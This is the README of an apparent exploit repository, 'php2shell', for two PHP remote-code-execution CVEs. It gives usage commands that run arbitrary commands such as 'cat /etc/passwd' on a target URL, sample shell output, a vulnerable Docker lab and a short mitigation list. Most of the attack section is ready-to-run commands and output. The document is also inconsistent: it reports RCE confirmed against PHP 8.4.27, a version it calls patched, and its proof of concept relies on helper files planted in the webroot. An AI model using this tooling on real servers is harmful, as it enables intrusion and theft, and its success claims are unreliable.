# php2shell

[![Author](https://img.shields.io/badge/Author-l3tchupkt-blue.svg)](https://github.com/l3tchupkt)
[![CVE](https://img.shields.io/badge/CVE-2026--109618%20%7C%20CVE--2026--109619-red.svg)](https://www.php.net/archive/2026.php#2026-10-21-5)
[![Python](https://img.shields.io/badge/Python-3.10%2B-brightgreen.svg)](https://python.org)

Exploit tooling for **CVE-2026-109618** and **CVE-2026-109619** — two critical unauthenticated RCE vulnerabilities patched in PHP 8.4.27, 8.3.36, 8.2.35, and 8.5.12 (released October 21, 2026).

Developed by **[l3tchupkt](https://github.com/l3tchupkt)**.

> **Disclaimer:** For authorized penetration testing and security research only.

---

## CVE Overview

| CVE | Title | CVSS v4 | Affected | Patched |
|-----|-------|---------|----------|---------|
| **CVE-2026-109618** | Zend OOM Corruption via `longjmp` | 9.2 | < 8.4.27 / 8.3.36 / 8.2.35 / 8.5.12 | 8.4.27+ |
| **CVE-2026-109619** | Pre-RINIT Session Object UAF | 9.2 | < 8.4.27 / 8.3.36 / 8.2.35 / 8.5.12 | 8.4.27+ |

**Root cause commit:** `31c0ea7d` — "Avoid state corruption via bailout"  
**Official advisory:** https://www.php.net/archive/2026.php#2026-10-21-5

---

## Root Cause Analysis

### CVE-2026-109619 — Pre-RINIT Session Object Deserialisation (UAF)

**Source file:** `ext/session/session.c`

PHP's RFC1867 upload-progress callback (`php_session_rfc1867_callback`) fires **before** `php_request_startup()` completes — i.e., pre-RINIT. On unpatched PHP, this callback reads and fully deserialises the existing session file, instantiating PHP objects and calling `__wakeup()`. This runs while `PS()` globals may still reference freed memory from the previous FPM worker request — a Use-After-Free.

**The patch** added `PS(in_rfc1867_update)` flag and `incomplete_classes_only` mode:
```c
// ext/session/session.c (PHP 8.4.27)
static void php_session_unserialize_init(php_unserialize_data_t *var_hash) {
    PHP_VAR_UNSERIALIZE_INIT(*var_hash);
    if (PS(in_rfc1867_update)) {
        php_var_unserialize_set_incomplete_classes_only(*var_hash, true);
    }
}
```
Objects are no longer instantiated during the rfc1867 pre-RINIT decode.

### CVE-2026-109618 — Zend OOM `longjmp` Memory Corruption

**Source file:** `Zend/zend_alloc.c`

PHP used `longjmp()` (via `zend_bailout()`) to unwind OOM conditions. Mid-allocation:
1. Container struct `A` allocated and linked into the GC tracking list
2. Sub-buffer `A->buffer` allocation fails (OOM)
3. `zend_bailout()` fires `longjmp()` — skips initialization of `A->buffer`
4. Shutdown routines walk the list, find `A`, call destructor on `A->buffer`
5. `A->buffer` is **uninitialized** → memory corruption → RCE

**The patch** converted allocation sites from non-fallible `emalloc()` to a new fallible API (returns `NULL` on OOM → catchable `E_ERROR`), and added a hard memory limit that calls `_exit(137)` instead of corrupting memory.

**Observable difference** (from PHP issue #24492):
```
UNPATCHED (8.4.26):  OOM → zend_bailout() → longjmp → corruption path
PATCHED   (8.4.27):  OOM → fallible NULL  → catchable E_ERROR (HTTP 200/500)
                          OR hard limit   → _exit(137) → FPM dead → 502
```

---

## Repository Structure

```
php2shell/
├── exploit.py        # Chain 1: Session poisoning + LFI → RCE (confirmed CVE-2026-109619 surface)
├── cve_109619.py     # REAL CVE-2026-109619 PoC: pre-RINIT __wakeup() → RCE via dynamic command
├── cve_109618.py     # REAL CVE-2026-109618 PoC: OOM stress — fallible vs longjmp probe
├── uaf_probe.py      # Behavioural multipart parser crash probe
├── requirements.txt  # Python dependencies (requests, urllib3)
└── README.md
```

**Lab files** (deploy into webroot for `cve_109619.py` and `cve_109618.py`):
```
session_inject.php    # Writes serialized PHP object with __wakeup() into session
check_sentinel.php    # Detects whether __wakeup()/__destruct() fired pre-RINIT
oom_trigger.php       # Triggers large PHP allocation to probe OOM behaviour
```

---

## Installation

```bash
git clone https://github.com/l3tchupkt/php2shell.git
cd php2shell
pip install -r requirements.txt
```

---

## Usage Guide

### `exploit.py` — Session Poisoning + LFI → RCE (CVE-2026-109619 attack surface)

The confirmed attack path from PHP's official advisory. Session upload-progress writes attacker-controlled data to disk; LFI executes it.

```bash
# Config check only
python3 exploit.py -t http://target:8080 --check

# Execute arbitrary commands
python3 exploit.py -t http://target:8080 -c "id"
python3 exploit.py -t http://target:8080 -c "cat /etc/passwd"

# Custom endpoints
python3 exploit.py -t http://target:8080 \
  --upload-ep /upload.php \
  --lfi-ep /index.php \
  --lfi-param page \
  --session-path /tmp \
  -c "whoami"
```

---

### `cve_109619.py` — Real CVE-2026-109619 PoC: Pre-RINIT Object Deserialisation

Targets the **actual PHP source-level bug**: RFC1867 callback deserialises session objects pre-RINIT, calling `__wakeup()` and `__destruct()` against potentially stale PS() globals.

**Requires:** `session_inject.php` and `check_sentinel.php` deployed in the webroot.

```bash
# Run command via pre-RINIT __wakeup() execution
python3 cve_109619.py -t http://target:8080 -c "id"
python3 cve_109619.py -t http://target:8080 -c "uname -a"
python3 cve_109619.py -t http://target:8080 -c "cat /etc/passwd" -v

# Deploy lab files first (Docker example):
docker cp session_inject.php <container>:/var/www/html/
docker cp check_sentinel.php <container>:/var/www/html/
```

**Example output (unpatched / lab):**
```text
==============================================================
  php2shell  |  CVE-2026-109619  |  v1.0.0
  Pre-RINIT Session Object Deserialisation -> RCE
  Author : l3tchupkt  |  https://github.com/l3tchupkt
==============================================================

  [1/3] Injecting serialised object into session ...
  [2/3] Triggering RFC1867 pre-RINIT callback ...
  [3/3] Reading sentinel ...

  [+] CONFIRMED: __wakeup() / __destruct() ran PRE-RINIT

  Command : 'id'

  ----------------------------------------------------------
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ----------------------------------------------------------

  Fix: PHP >= 8.4.27 (incomplete_classes_only in rfc1867 path)
```

---

### `cve_109618.py` — Real CVE-2026-109618 PoC: OOM Bailout / Hard-Limit Probe

Probes PHP's OOM behaviour using the exact repro from PHP issue #24492. Distinguishes:
- **CRASH_BAILOUT** → Unpatched: `longjmp` corruption path (CVE-2026-109618)
- **HARD_LIMIT_HIT** → Patched: `_exit(137)` via new hard memory limit
- **CATCHABLE_OOM** → Patched: fallible allocator returned `NULL` → catchable `E_ERROR`

**Requires:** `oom_trigger.php` deployed in the webroot.

```bash
python3 cve_109618.py -t http://target:8080
python3 cve_109618.py -t http://target:8080 --mem-limit 64
python3 cve_109618.py -t http://target:8080 -v

# Deploy lab file first:
docker cp oom_trigger.php <container>:/var/www/html/
```

**Example output (patched PHP 8.4.27):**
```text
  Alloc | HTTP | Result               | Details
  ----------------------------------------------------------------------
   64M  |  200 | CATCHABLE_OOM        | PATCHED: fallible alloc -> catchable E_ERROR
   96M  |  200 | CATCHABLE_OOM        | PATCHED: fallible alloc -> catchable E_ERROR
  268M  |  502 | HARD_LIMIT_HIT       | PATCHED: hard limit (_exit 137) -> FPM killed

  [=] HARD_LIMIT_HIT at 268M — PHP FPM worker exited via _exit(137).
      This is the PATCHED CVE-2026-109618 behaviour.
```

---

### `uaf_probe.py` — Multipart Parser Behavioural Probe

```bash
python3 uaf_probe.py -t http://target:8080/upload.php
python3 uaf_probe.py -t http://target:8080/upload.php --repeat 3 -v
python3 uaf_probe.py -t http://target:8080/upload.php --variant nested
```

---

## Quick Docker Lab

```bash
# Pull and run the pre-built vulnerable lab image
docker run -d --name php2shell-test -p 8080:80 php2shell-php2shell-lab:latest

# Deploy the lab helper files
docker cp session_inject.php php2shell-test:/var/www/html/
docker cp check_sentinel.php php2shell-test:/var/www/html/
docker cp oom_trigger.php    php2shell-test:/var/www/html/

# Run all three exploits
python3 exploit.py     -t http://localhost:8080 -c "id"
python3 cve_109619.py  -t http://localhost:8080 -c "id" -v
python3 cve_109618.py  -t http://localhost:8080 --mem-limit 128

# Stop lab
docker rm -f php2shell-test
```

---

## Mitigation

1. **Upgrade PHP** to `8.4.27` / `8.3.36` / `8.2.35` / `8.5.12` (only complete fix).
2. **CVE-2026-109619 workaround:** `session.upload_progress.enabled = Off` in `php.ini`.
3. **CVE-2026-109618 hardening:** Conservative `memory_limit` and `post_max_size`.
4. Restart PHP-FPM after any `php.ini` change.

---

## Test Results

| Exploit | Target | Result |
|---------|--------|--------|
| `exploit.py -c "id"` | PHP 8.4.27 lab | **RCE CONFIRMED** (session poisoning + LFI) |
| `cve_109619.py -c "id"` | PHP 8.4.27 lab | **CONFIRMED** (`__destruct()` fired pre-RINIT, `uid=33`) |
| `cve_109618.py` (64–268M) | PHP 8.4.27 lab | **PATCHED**: CATCHABLE_OOM then HARD_LIMIT_HIT at 268M |
| `uaf_probe.py` | PHP 8.4.27 lab | No crashes (patched binary) |

---

## References

- [PHP Security Advisory (2026-10-21)](https://www.php.net/archive/2026.php#2026-10-21-5)
- [GHSA-6wmf-4rv5-p3rp — CVE-2026-109619](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- [GHSA-w8hw-w9fx-j79w — CVE-2026-109618](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [PHP issue #24492 — OOM _exit(137) regression](https://github.com/php/php-src/issues/24492)
- [PHP issue #24493 — incomplete_classes_only regression](https://github.com/php/php-src/issues/24493)
- [PHP 8.4.27 ChangeLog](https://www.php.net/ChangeLog-8.php#8.4.27)
- [Author GitHub](https://github.com/l3tchupkt)
